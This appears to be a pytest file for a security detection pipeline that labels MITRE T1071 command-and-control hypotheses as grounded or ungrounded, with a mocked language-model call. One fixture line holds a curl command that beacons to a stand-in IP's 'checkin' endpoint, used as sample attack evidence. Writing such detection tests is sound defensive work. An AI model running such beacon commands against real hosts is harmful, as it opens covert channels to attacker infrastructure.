"""
Tests for the T1071 grounding label (Phase 2 step 2.4, 2026-10-10).

The evidentiary check labels T1071 hypotheses "grounded"/"ungrounded" instead
of dropping them, so every alert keeps all its hypotheses and continues
through the pipeline.
"""
from __future__ import annotations

import json
from datetime import datetime, timezone
from unittest.mock import patch

import pytest

from perception.nce_contract import NCEHypothesis, NCEInput
from perception.nce_engine import generate_hypotheses, label_t1071_grounding


def _hyp(technique: str) -> NCEHypothesis:
    return NCEHypothesis(
        technique_id=technique, source_account="m.chen", source_host="WKSTN-1",
        target_host="unknown", nce_confidence=0.5, supporting_evidence_refs=["raw_log_line"],
    )


WEAK = {"process_name": "outlook.exe", "raw_log_line": "category=Exfiltration target=LT-6633-CORP"}
STRONG = {"command_line": "curl.exe -s http://203.0.113.5:8443/checkin?id=1"}


def test_weak_evidence_labels_ungrounded_and_keeps_everything():
    hyps = [_hyp("T1078"), _hyp("T1071"), _hyp("T1562")]
    out = label_t1071_grounding(hyps, WEAK)
    assert [h.technique_id for h in out] == ["T1078", "T1071", "T1562"]
    assert [h.evidence_grounding for h in out] == [None, "ungrounded", None]


def test_strong_evidence_labels_grounded():
    out = label_t1071_grounding([_hyp("T1071")], STRONG)
    assert out[0].evidence_grounding == "grounded"


def test_label_survives_status_transitions():
    h = label_t1071_grounding([_hyp("T1071")], WEAK)[0]
    from perception.nce_contract import HypothesisStatus
    assert h.with_status(HypothesisStatus.FEASIBLE).evidence_grounding == "ungrounded"


def test_invalid_label_rejected():
    with pytest.raises(ValueError, match="evidence_grounding"):
        NCEHypothesis(technique_id="T1071", source_account="a", source_host="b", target_host="c",
                      nce_confidence=0.5, supporting_evidence_refs=[], evidence_grounding="maybe")


@patch("perception.nce_engine._call_gemini_nce")
def test_t1071_only_alert_no_longer_fails(mock_call):
    """Previously the filter dropped the only hypothesis and the call returned success=False."""
    hyp = {"technique_id": "T1071", "source_account": "m.chen", "source_host": "WKSTN-1",
           "target_host": "unknown", "nce_confidence": 0.45,
           "supporting_evidence_refs": ["raw_log_line"], "missing_context_flags": []}
    mock_call.return_value = {"raw_response": json.dumps([hyp]), "parsed": [hyp], "parse_error": None}
    nce_input = NCEInput(incident_id="INC-T1071", evidence_fields=dict(WEAK),
                         timestamp=datetime.now(timezone.utc))
    result = generate_hypotheses(nce_input)
    assert result.success is True
    assert len(result.output.hypotheses) == 1
    assert result.output.hypotheses[0].evidence_grounding == "ungrounded"
